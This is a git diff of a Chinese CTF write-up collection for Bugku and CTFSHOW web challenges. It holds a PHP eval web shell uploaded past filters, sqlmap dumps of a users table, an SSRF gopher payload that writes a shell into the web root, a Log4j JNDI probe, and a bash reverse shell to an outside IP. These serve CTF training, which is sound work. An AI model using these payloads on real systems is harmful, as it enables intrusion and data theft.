@@ -4066,150 +4066,6 @@ array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockeren
 
 ------
 
-## Bugku
-
-### xxx二手交易市场
-
-先随便注册一个用户登录上去，然后上传头像这个功能存在文件上传漏洞。
-
-编写`PHP`一句话木马：
-
-```php
-<?php @eval($_POST['t0ur1st']); ?>
-```
-
-`base64`加密后得到字符串`PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==`。
-
-随便点击一张图片上传，然后修改图片信息为
-
-```
-image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
-```
-
-可以看到上传成功的响应头信息如下：
-
-```json
-HTTP/1.1 200 OK
-Server: nginx/1.18.0
-Date: Sun, 07 Apr 2024 09:31:29 GMT
-Content-Type: application/json; charset=utf-8
-Connection: close
-X-Powered-By: PHP/7.3.22
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Content-Length: 98
-
-{"code":1,"msg":"保存成功!","data":"\/Uploads\/heads\/8c9898401a38fdad.php","url":"","wait":3}
-```
-
-使用蚁剑连接靶机，打开虚拟终端。
-
-```bash
-$ find / -name flag*
-$ cat /var/www/html/flag
-flag{27be6f3753c7a1b12345a7a5a7d1127c}
-```
-
-提交`flag{27be6f3753c7a1b12345a7a5a7d1127c}`即可。
-
-------
-
-### 文件上传
-
-编写`PHP`一句话木马：
-
-```php
-<?php @eval($_POST['t0ur1st']); ?>
-```
-
-点击上传后，可以看到`Burp Suite`的请求如下：
-
-```
-POST /index.php HTTP/1.1
-Host: 114.67.175.224:12169
-Content-Length: 422
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://114.67.175.224:12169
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://114.67.175.224:12169/index.php
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
-Connection: close
-
-------WebKitFormBoundaryR2qZKqgQHD5pKJDR
-Content-Disposition: form-data; name="file"; filename="6.php"
-Content-Type: application/octet-stream
-
-<?php @eval($_POST['t0ur1st']); ?>
-
-/*
-image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
-*/
-------WebKitFormBoundaryR2qZKqgQHD5pKJDR
-Content-Disposition: form-data; name="submit"
-
-Submit
-------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
-```
-
-请求头部的 `Content-Type` 内容，随便改个大写字母过滤掉，比如 `mulTipart/form-data`
-所上传的文件后缀改为 `.php4`，依次尝试`php4`，`phtml`，`phtm`，`phps`，`php5`（包括一些字母改变大小写）
-请求数据的 `Content-Type` 内容改为 `image/jpeg`。
-
-```
-POST /index.php HTTP/1.1
-Host: 114.67.175.224:12169
-Content-Length: 422
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://114.67.175.224:12169
-Content-Type: mulTipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://114.67.175.224:12169/index.php
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
-Connection: close
-
-------WebKitFormBoundaryR2qZKqgQHD5pKJDR
-Content-Disposition: form-data; name="file"; filename="6.php4"
-Content-Type: image/jpeg
-
-<?php @eval($_POST['t0ur1st']); ?>
-
-/*
-image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
-*/
-------WebKitFormBoundaryR2qZKqgQHD5pKJDR
-Content-Disposition: form-data; name="submit"
-
-Submit
-------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
-```
-
-上传成功后可以看到
-
-> Upload Success
-> Stored in: [upload/bugku07095101_5795.php4](http://114.67.175.224:12169/upload/bugku07095101_5795.php4)
-
-使用蚁剑连接靶机，打开虚拟终端。
-
-```bash
-$ find / -name flag*
-$ cat /flag
-flag{fbd8c508888c770a01c094a4ba2f4c00}
-```
-
-提交`flag{fbd8c508888c770a01c094a4ba2f4c00}`即可。
-
-------
-
 ## CTFSHOW
 
 ### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)
@@ -4310,6 +4166,98 @@ string(16) "CTF{easy_base64}"
 用`HackBar`构造`POST`请求求解吧，访问靶机的`/check.php`，点击`MODIFY HEADER`添加HTTP头，新增User-Agent值为`ctf-show-brower`，在Body填入`username=admin&password=CTF{easy_base64}`。
 
 发送`POST`请求后得到`flag`，提交`CTF{user_agent_inject_success}`即可。
+
+------
+
+### 联合查询注入
+
+进入靶机后看到文章目录，点击第一篇文章，靶机请求`/?pid=1`页面。随便点几个，发现都是通过`pid`来获取文章。用`sqlmap`爆破数据库。
+
+```bash
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "http://b560c33f-0fc1-4e29-b0a1-ef54d02ca37e.challenge.ctf.show/?pid=1" --dbs
+sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
+---
+Parameter: pid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pid=1 AND 6752=6752
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pid=1 AND (SELECT 6575 FROM (SELECT(SLEEP(5)))lMnQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: pid=-3722 UNION ALL SELECT NULL,CONCAT(0x7176716a71,0x6b595a534850596c51557055664c56684a42727a72544b6768525a426964697a6d624f4b43687242,0x7171626a71),NULL-- -
+---
+[INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.20.1, PHP 7.3.11
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[INFO] fetching database names
+[INFO] retrieved: 'information_schema'
+[INFO] retrieved: 'test'
+[INFO] retrieved: 'mysql'
+[INFO] retrieved: 'performance_schema'
+[INFO] retrieved: 'ctfshow_page_informations'
+available databases [5]:                                                         
+[*] ctfshow_page_informations
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "http://b560c33f-0fc1-4e29-b0a1-ef54d02ca37e.challenge.ctf.show/?pid=1" --current-db
+[INFO] fetching current database
+[WARNING] reflective value(s) found and filtering out
+current database: 'ctfshow_page_informations
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "http://b560c33f-0fc1-4e29-b0a1-ef54d02ca37e.challenge.ctf.show/?pid=1" -D ctfshow_page_informations --tables
+[INFO] fetching tables for database: 'ctfshow_page_informations'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'pages'
+[INFO] retrieved: 'users'
+Database: ctfshow_page_informations                                              
+[2 tables]
++-------+
+| pages |
+| users |
++-------+
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "http://b560c33f-0fc1-4e29-b0a1-ef54d02ca37e.challenge.ctf.show/?pid=1" -D ctfshow_page_informations -T users --columns
+[INFO] fetching columns for table 'users' in database 'ctfshow_page_informations' [WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'id','int(11)'
+[INFO] retrieved: 'username','varchar(32)'
+[INFO] retrieved: 'password','varchar(32)'
+Database: ctfshow_page_informations                                              
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(32) |
+| username | varchar(32) |
++----------+-------------+
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "http://b560c33f-0fc1-4e29-b0a1-ef54d02ca37e.challenge.ctf.show/?pid=1" -D ctfshow_page_informations -T users -C username,password --dump
+[INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'ctfshow_page_informations'                                       
+[WARNING] reflective value(s) found and filtering out
+Database: ctfshow_page_informations
+Table: users
+[1 entry]
++----------+----------------------------+
+| username | password                   |
++----------+----------------------------+
+| admin    | CTF{admin_secret_password} |
++----------+----------------------------+
+```
+
+提交`CTF{admin_secret_password}`即可。
 
 ------
 
@@ -4779,6 +4727,90 @@ $flag = "CTF{reverse_shell_use_nc}";"
 ```
 
 提交`CTF{reverse_shell_use_nc}`即可。
+
+------
+
+### 红包赛第九弹
+
+靶机给出一个登录框，密码被默认填充了，账号输入`admin`，用`Burp Suite`抓包，发现`POST`数据是：
+
+```
+u=admin&returl=https%3A%2F%2F404.chall.ctf.show%2F
+```
+
+第二个输入框的参数并不是密码而是`returl`，SSRF漏洞实锤了。根据题目描述的3306推测是`mysql`，用[Gopherus](https://github.com/tarunkant/Gopherus)构造`Payload`，利用`SQL`将`PHP`一句话木马写入网站目录中的`.php`文件。
+
+我们想要执行的`SQL`语句如下：
+
+```sql
+SELECT '<?php @eval($_POST["t0ur1st"]);?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+`Gopherus`的运行结果如下：
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tools]
+└─$ python2 Gopherus/gopherus.py --exploit mysql
+
+  ________              .__                                                       
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______                         
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                         
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                          
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                         
+        \/       |__|        \/     \/                 \/ 
+        
+        author: $_SpyD3r_$                                                 
+                                                                                   
+For making it work username should not be password protected!!!
+
+Give MySQL username: root
+Give query to execute: SELECT '<?php @eval($_POST["t0ur1st"]);?>' INTO OUTFILE '/var/www/html/shell.php';
+
+Your gopher link is ready to do SSRF :
+gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%53%00%00%00%03%53%45%4c%45%43%54%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%74%30%75%72%31%73%74%22%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%27%3b%01%00%00%00%01
+
+-----------Made-by-SpyD3r-----------
+```
+
+用`Python`对gopher link再进行一次`URL`编码。
+
+```python
+>>> from urllib.parse import quote
+>>> quote('gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%53%00%00%00%03%53%45%4c%45%43%54%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%74%30%75%72%31%73%74%22%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%27%3b%01%00%00%00%01')
+'gopher%3A//127.0.0.1%3A3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2553%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2527%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2574%2530%2575%2572%2531%2573%2574%2522%255d%2529%253b%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501'
+```
+
+用`Burp Suite`抓包，将再次`URL`编码后的gopher link填入`returl`框中发送请求，在`Response`中看到`HTTP/1.1 200 OK`就说明`SSRF`漏洞利用成功，我们遂即可以访问靶机的`shell.php`。
+
+```
+POST /check.php HTTP/1.1
+Host: 3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show
+Content-Length: 1339
+Cache-Control: max-age=0
+Origin: http://3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+u=admin&returl=gopher%3A//127.0.0.1%3A3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2553%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2527%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2574%2530%2575%2572%2531%2573%2574%2522%255d%2529%253b%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
+```
+
+用`AntSword`连接靶机的`shell.php`，在文件管理中访问靶机根目录可以看到`/flag.txt`。
+
+或者用`HackBar`填充`POST`数据请求靶机的`shell.php`，`t0ur1st=system('ls /');`查看靶机根目录。
+
+> bin dev etc flag.sh flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
+
+`t0ur1st=system('cat /flag.txt');`查看`/flag.txt`文件内容。
+
+> ctfshow{c5187c11-5ff4-4558-b402-32bcf09325d7}
+
+提交`ctfshow{c5187c11-5ff4-4558-b402-32bcf09325d7}`即可。
 
 ------
 
@@ -8777,7 +8809,7 @@ Listening on 0.0.0.0 9999
 >>> from base64 import b64encode
 >>> s = 'bash -i >& /dev/tcp/34.169.108.13/9999 0>&1'
 >>> b64encode(s.encode()).decode()
-b'YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ=='
+'YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ=='
 >>> from urllib.parse import quote
 >>> quote('YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ==')
 'YmFzaCAtaSA%2BJiAvZGV2L3RjcC8zNC4xNjkuMTA4LjEzLzk5OTkgMD4mMQ%3D%3D'
@@ -9099,87 +9131,517 @@ ctfshow{879b92f5-af3c-40dd-bb63-c6bcc0086d1a}
 
 ------
 
-### 红包赛第九弹
+## Bugku
 
-靶机给出一个登录框，密码被默认填充了，账号输入`admin`，用`Burp Suite`抓包，发现`POST`数据是：
+### Apache Log4j2 RCE
 
-```
-u=admin&returl=https%3A%2F%2F404.chall.ctf.show%2F
-```
+> 描述： /bin/bash：x ； /bin/sh √ ; /dev/tcp × ； nc -e x ; nc a.cc 1234 -e √ ;
 
-第二个输入框的参数并不是密码而是`returl`，SSRF漏洞实锤了。根据题目描述的3306推测是`mysql`，用[Gopherus](https://github.com/tarunkant/Gopherus)构造`Payload`，利用`SQL`将`PHP`一句话木马写入网站目录中的`.php`文件。
+启动场景后，靶机连接是http://171.80.2.169:13907。
 
-我们想要执行的`SQL`语句如下：
+这道题是复现2021年12月的`Apche Log4j`远程代码执行漏洞，其漏洞编号是CVE-2021-44228。
 
-```sql
-SELECT '<?php @eval($_POST["t0ur1st"]);?>' INTO OUTFILE '/var/www/html/shell.php';
-```
+> Apache Log4j通过定义每一条日志信息的级别能够更加细致地控制日志生成地过程，受影响地版本中纯在JNDI注入漏洞，导致日志在记录用户输入地数据时，触发了注入漏洞，该漏洞可导致远程代码执行，且利用条件低，影响范围广，小到网站，大到可联网的车都受影响。
 
-`Gopherus`的运行结果如下：
-
-```bash
-┌──(t0ur1st㉿kali)-[~/tools]
-└─$ python2 Gopherus/gopherus.py --exploit mysql
-
-  ________              .__                                                       
- /  _____/  ____ ______ |  |__   ___________ __ __  ______                         
-/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                         
-\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                          
- \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                         
-        \/       |__|        \/     \/                 \/ 
-        
-        author: $_SpyD3r_$                                                 
-                                                                                   
-For making it work username should not be password protected!!!
-
-Give MySQL username: root
-Give query to execute: SELECT '<?php @eval($_POST["t0ur1st"]);?>' INTO OUTFILE '/var/www/html/shell.php';
-
-Your gopher link is ready to do SSRF :
-gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%53%00%00%00%03%53%45%4c%45%43%54%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%74%30%75%72%31%73%74%22%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%27%3b%01%00%00%00%01
-
------------Made-by-SpyD3r-----------
-```
-
-用`Python`对gopher link再进行一次`URL`编码。
-
-```python
->>> from urllib.parse import quote
->>> quote('gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%53%00%00%00%03%53%45%4c%45%43%54%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%74%30%75%72%31%73%74%22%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%27%3b%01%00%00%00%01')
-'gopher%3A//127.0.0.1%3A3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2553%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2527%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2574%2530%2575%2572%2531%2573%2574%2522%255d%2529%253b%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501'
-```
-
-用`Burp Suite`抓包，将再次`URL`编码后的gopher link填入`returl`框中发送请求，在`Response`中看到`HTTP/1.1 200 OK`就说明`SSRF`漏洞利用成功，我们遂即可以访问靶机的`shell.php`。
+进入靶机后，看到一个登录界面。用`Burp Suite`抓包，随便输入账号`admin`，密码`123456`看看情况。在`Response`中，可以看到内容：
 
 ```
-POST /check.php HTTP/1.1
-Host: 3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show
-Content-Length: 1339
-Cache-Control: max-age=0
-Origin: http://3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show
-Content-Type: application/x-www-form-urlencoded
-Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 
+Source: /source.zip
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 35
+Date: Mon, 26 Jan 2026 15:37:22 GMT
+Keep-Alive: timeout=60
+Connection: keep-alive
+
+用户名或密码错误，次数 0
+```
+
+登录失败不要紧，重点在于`/source.zip`给出了网站的备份文件，将其下载到本地主机。
+
+使用`dnslog`域名解析探测靶机是否存在`Log4j`漏洞，`POC`为`${jndi:ldap://dns}`，通过`ldap`协议进行域名解析，被记录则说明存在漏洞。
+
+使用域名解析工具`http://dnslog.cn/`，先`Get SubDomain`获取一个`DNS`子域名`4ng4oo.dnslog.cn`，再用`Burp Suite`发送`POSt`请求，其中输入账号`user`为`${jndi:ldap://4ng4oo.dnslog.cn}`。
+
+```
+POST /login HTTP/1.1
+Host: 171.80.2.169:13907
+Content-Length: 44
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show/
+Content-type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://171.80.2.169:13907
+Referer: http://171.80.2.169:13907/
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
 Connection: keep-alive
 
-u=admin&returl=gopher%3A//127.0.0.1%3A3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2553%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2527%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2574%2530%2575%2572%2531%2573%2574%2522%255d%2529%253b%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
+user=${jndi:ldap://4ng4oo.dnslog.cn}&pwd=123456
 ```
 
-用`AntSword`连接靶机的`shell.php`，在文件管理中访问靶机根目录可以看到`/flag.txt`。
+登录失败不要紧，重点是点击`Refresh Record`可以看到两条记录，说明存在Apache Log4j2 RCE漏洞。
 
-或者用`HackBar`填充`POST`数据请求靶机的`shell.php`，`t0ur1st=system('ls /');`查看靶机根目录。
+| DNS Query Record |   IP Address    |    Created Time     |
+| :--------------: | :-------------: | :-----------------: |
+| 4ng4oo.dnslog.cn | 111.172.239.156 | 2026-01-26 23:45:50 |
+| 4ng4oo.dnslog.cn |  183.2.141.97   | 2026-01-26 23:45:49 |
 
-> bin dev etc flag.sh flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
